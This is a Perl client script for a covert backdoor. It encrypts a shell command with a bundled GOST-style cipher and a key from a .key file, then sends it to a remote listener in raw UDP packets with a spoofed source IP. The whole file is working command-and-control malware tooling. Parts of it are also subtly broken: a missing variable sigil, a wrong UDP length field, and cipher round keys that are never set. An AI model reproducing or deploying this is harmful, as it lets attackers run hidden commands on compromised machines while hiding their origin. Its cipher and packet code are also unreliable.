#!/usr/bin/perl
# this is the client to send commands to the server..
# an example is as follows..
# ./sendc -o cherry -d pear -p 52000 -s 1243 -c "echo "hello">hello.txt"
# dont forget to double quote for now..
# (plastek)

use Net::RawIP;
require 'getopts.pl';
Getopts('o:d:p:s:c:');
die "Usage: $0 -o (origin) -d (destination) -p (port) -s (source port) -c (command to server)"
	unless ($opt_o && $opt_d && $opt_p && $opt_s && opt_c);
my ($origin, $destip, $destport, $sport, $send_command) = ($opt_o, $opt_d, $opt_p, $opt_s, $opt_c);

open(OKEY, "< .key");
for my $line(<OKEY>){
	$key = $line;
}
close OKEY;
	my $command = "./$send_command";
	my $blew = Gh0ST0r->new($key);
	my $data = $blew->egadz($command);
	my $p = new Net::RawIP({udp	=>{
				source  => $sport,
				dest 	=> $destport,
				len  	=> $data,
				data	=> $data}});			
	$p->set({ip => 	{ saddr => "$origin",
			daddr	=> "$destip"}

	});
$p->send();
package Gh0ST0r;

use vars qw( @b @t @R @S @h @o @K);

sub new {
    my ( $argument, $pp ) = @_;
    Setup( $pp );
    my $class = ref ( $argument ) || $argument;
    my $self = {};
    bless $self, $class;
    return $self;
} 

sub egadz {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax );
}

sub gee_golly {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax, 1 );
}

sub Gh0ST {
    my ( $v, $w, $a, $q, $c, $out, $self );
    my ( $e, $d ) = @_;
    @h = 0 .. 7;
    @o = reverse @h;
    while ( $a < length $e ) {
        $v = N( $e, $a );
        $w = N( $e, ( $a += 8 ) - 4 );
        grep $q++ % 2 ? $v ^= F( $w + $K[ $_ ] ) : ( $w ^= F( $v + $K[ $_ ] ) ), $d ? ( @h, ( @o ) x 3 ) : ( ( @h ) x 3, @o );
        $out .= pack N2, $w, $v;
    }
    return $out;
}

sub F {
    my $u = 0;
    grep $u |= $S[ $_ ][ $_[ 0 ] >> $_ * 4 & 15 ] << $_ * 4, reverse 0 .. 7;
    return $u << 11 | $u >> 21;
}

sub R {
    return int( (shift) * rand );
}

sub N {
    return vec $_[ 0 ], $_[ 1 ] / 4, 32;
}

sub Setup {
    my $p = shift;
    my ( $s, $i, $c );
    for ( $i = 0; $i < length $p; $i += 4 ) {
        srand( $s ^= N( $p, $i ) );
    }
    @b = @t = 0 .. 15;
    while ( $c < 8 ) {
        grep { push @b, splice @b, R( 9 ), 5 } @t;
        $R[ $c ] = R( 2**32 );
        @{ $S[ $c++ ] } = @b;
    }

}

1;
__END__
